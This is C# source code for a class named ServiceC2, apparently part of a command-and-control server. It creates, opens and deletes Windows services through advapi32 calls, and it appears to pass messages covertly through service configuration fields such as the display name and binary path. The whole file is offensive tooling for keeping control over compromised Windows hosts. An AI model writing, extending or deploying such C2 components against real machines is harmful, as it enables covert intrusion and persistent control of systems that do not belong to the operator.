using System;
using System.Runtime.InteropServices;


namespace ServiceC2Server
{

    internal class ServiceC2
    {
     
        private string name;
        private IntPtr schService;
        private IntPtr schSCManager;


        public ServiceC2(string name)
        {
            this.name = name;
            SchSCManager = IntPtr.Zero;
            schService = IntPtr.Zero;
        }

        public string Name { get => name; set => name = value; }
        public IntPtr SchSCManager { get => schSCManager; set => schSCManager = value; }
        public IntPtr SchService { get => schService; set => schService = value; }


        public IntPtr Connect()
        {
            schSCManager = OpenSCManager(null, null, 0xF003F);
            if (schSCManager == IntPtr.Zero)
            {
                Console.WriteLine("[-] OpenSCManager: Failed to get SCM handle: ");
                return schService;
            }
            Console.WriteLine("[+] OpenSCManager [OK]");

            SchService = OpenService(schSCManager, name, 0xF01FF);
            if (schService == IntPtr.Zero)
            {
                Console.WriteLine("[-] OpenService: Failed to connect to service, might not exist... ");
                schService = CreateService();
            } else
            {
                Console.WriteLine("[+] OpenService [OK]");
            }

            return schService;
        }

        public IntPtr CreateService()
        {
            Console.WriteLine("[*] Trying to create a new service called: " + name);
            schService = CreateServiceA(schSCManager, name, "30", 0xF003F, 0x00000010, 0x00000004, 0x00000000, "Ready", null, null, null, null, null);
            if (schService == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to create service... Closing down");
                Environment.Exit(1);
            }
            Console.WriteLine("[+] CreateService [OK]");
            return schService;
        }

        public void Shutdown(bool ctrlc)
        {
            Console.WriteLine("[+] Closing down...");

            Program.PostOutput(this, "Exit");

            bool success = DeleteService(schService);
            if (success)
            {
                Console.WriteLine("[+] DeleteService [OK]");
            } else
            {
                Console.WriteLine("[-] Failed to delete service...");
            }
            if (!ctrlc)
            {
                Environment.Exit(0);
            }
        }

        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool CloseServiceHandle(IntPtr hService);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern IntPtr CreateServiceA(IntPtr hSCManager, string lpServiceName, string lpDisplayName, uint dwDesiredAccess, uint dwServiceType, uint dwStartType, uint dwErrorControl, string lpBinaryPathName, [Optional] string lpLoadOrderGroup, [Optional] string lpdwTagId, [Optional] string lpDependencies, [Optional] string lpServiceStartName, [Optional] string lpPassword);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool DeleteService(IntPtr hService);

        [DllImport("kernel32.dll")]
        static extern uint GetLastError();
    }
}
